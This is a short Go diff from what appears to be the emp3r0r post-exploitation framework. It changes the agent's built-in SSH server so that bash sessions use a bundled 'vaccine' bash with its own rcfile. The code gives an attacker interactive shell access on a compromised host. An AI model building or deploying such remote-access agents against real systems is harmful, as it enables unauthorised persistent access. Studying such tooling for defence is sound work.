@@ -11,6 +11,8 @@ import (
 
 	"github.com/creack/pty"
 	"github.com/gliderlabs/ssh"
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 func setWinsize(f *os.File, w, h int) {
@@ -28,8 +30,14 @@ func SSHD(shell, port string) (err error) {
 		return
 	}
 
+	// vaccine bash
+	v_bash := emp3r0r_data.UtilsPath + "/bash"
+
 	ssh.Handle(func(s ssh.Session) {
 		cmd := exec.Command(exe)
+		if shell == "bash" && util.IsFileExist(v_bash) {
+			cmd = exec.Command(v_bash, "--rcfile", emp3r0r_data.UtilsPath+"/.bashrc")
+		}
 		cmd.Env = append(cmd.Env, os.Environ()...)
 		ptyReq, winCh, isPTY := s.Pty()
 		if isPTY {
